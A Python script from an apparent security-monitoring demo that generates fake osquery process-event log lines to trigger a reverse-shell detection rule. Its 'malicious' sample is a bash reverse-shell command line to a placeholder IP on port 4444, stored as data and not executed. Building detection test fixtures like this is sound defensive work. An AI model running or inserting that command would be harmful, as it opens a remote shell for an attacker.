#!/usr/bin/env python3
"""Generate realistic osquery result-log lines for the SecurityScarletAI demo.

Writes one JSON object per line (the exact format osqueryd emits to its
results log) to a target file. By default appends a benign process event
followed by a malicious one that matches
``rules/sigma/process/reverse_shell.yml`` (cmdline contains ``bash -i`` and
``/dev/tcp``) so the detection scheduler fires a critical alert.

Usage:
    python scripts/generate_osquery_events.py --path /tmp/osqueryd.results.log
    python scripts/generate_osquery_events.py --path <file> --malicious 3 --sleep 2

The FileShipper (src/ingestion/shipper.py) tails the same file when the API
is started with ENABLE_INGESTION_SHIPPER=true.
"""
from __future__ import annotations

import argparse
import json
import time
from datetime import datetime, timezone


def _line(name: str, cmdline: str, action: str = "added") -> str:
    return json.dumps(
        {
            "name": "processes",
            "hostIdentifier": "demo-mac.local",
            "calendarTime": datetime.now(tz=timezone.utc).strftime(
                "%a %b %d %H:%M:%S %Y UTC"
            ),
            "unixTime": int(time.time()),
            "epoch": 0,
            "counter": 0,
            "numerics": False,
            "columns": {
                "pid": "4242",
                "name": name,
                "path": f"/bin/{name}",
                "cmdline": cmdline,
                "uid": "501",
                "user": "demo",
            },
            "action": action,
        }
    )


BENIGN = ("python3", "python3 -m pytest tests/unit/test_shipper.py")
# Matches rules/sigma/process/reverse_shell.yml:
#   selection_bash_i    -> cmdline contains "bash -i"
#   selection_bash_tcp  -> cmdline contains "/dev/tcp"
MALICIOUS = (
    "bash",
    "bash -i >& /dev/tcp/203.0.113.66/4444 0>&1",
)


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument("--path", required=True, help="osquery results log file to append to")
    parser.add_argument(
        "--malicious",
        type=int,
        default=1,
        help="number of malicious (reverse-shell) lines to emit (default 1)",
    )
    parser.add_argument(
        "--benign",
        type=int,
        default=1,
        help="number of benign lines to emit before the malicious ones (default 1)",
    )
    parser.add_argument(
        "--sleep",
        type=float,
        default=0.0,
        help="seconds to wait between lines (useful for watching the tailer live)",
    )
    args = parser.parse_args()

    with open(args.path, "a") as f:
        for _ in range(args.benign):
            f.write(_line(*BENIGN) + "\n")
            f.flush()
            print(f"  benign  -> {BENIGN[0]}: {BENIGN[1]}")
            if args.sleep:
                time.sleep(args.sleep)
        for _ in range(args.malicious):
            f.write(_line(*MALICIOUS) + "\n")
            f.flush()
            print(f"  MALICIOUS -> {MALICIOUS[0]}: {MALICIOUS[1]}")
            if args.sleep:
                time.sleep(args.sleep)

    print(f"\nWrote {args.benign} benign + {args.malicious} malicious lines to {args.path}")
    print("If ENABLE_INGESTION_SHIPPER=true and the API is running, the FileShipper")
    print("will tail this file and the detection scheduler will fire a critical alert")
    print("within one rule run_interval (default 60s).")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
